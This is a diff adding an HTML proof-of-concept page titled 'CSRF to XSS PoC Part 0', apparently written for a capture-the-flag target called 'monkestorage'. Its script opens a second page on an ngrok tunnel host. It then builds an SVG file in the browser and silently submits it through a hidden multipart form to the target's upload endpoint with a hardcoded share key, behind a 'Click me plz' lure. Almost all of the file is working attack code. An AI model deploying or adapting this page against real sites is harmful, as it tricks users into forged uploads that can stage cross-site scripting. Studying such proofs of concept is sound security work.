@@ -1,0 +1,37 @@
+<html>
+    <body>
+        <h1>CSRF to XSS PoC Part 0</h1>
+        <script>
+            function launch(){
+                window.open('http://0.tcp.au.ngrok.io:13169/csrf1.html', '_blank'),focus();
+                var payload = [
+                    '<?xml version="1.0" standalone="no"?>\r\n',
+                    '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\r\n',
+                    '\r\n',
+                    '<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">\r\n',
+                    '\r\n',
+                    '<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>\r\n'
+                ];
+                payload.push('</svg>\r\n');
+
+                const dT = new DataTransfer();
+                const file = new File( payload, "init.svg" );
+                dT.items.add( file );
+                document.csrf[0].files = dT.files;
+            
+                setTimeout(() => {
+                    window.parent.close();
+                }, 500);
+
+                document.csrf.submit()
+            }
+        </script>
+            
+        <form style="display: none" name="csrf" method="post" action="http://monkestorage:3000/upload" enctype="multipart/form-data">
+            <input id="file" type="file" name="file" hidden/>
+            <input id="share_key" type="hidden" name="share_key" value="ff373618fbefa19991f1e123"/>
+            <input type="submit" name="" value="" size="0"/>
+        </form>
+        <button value="button" onclick="launch()">Click me plz</button>
+    </body>
+</html>
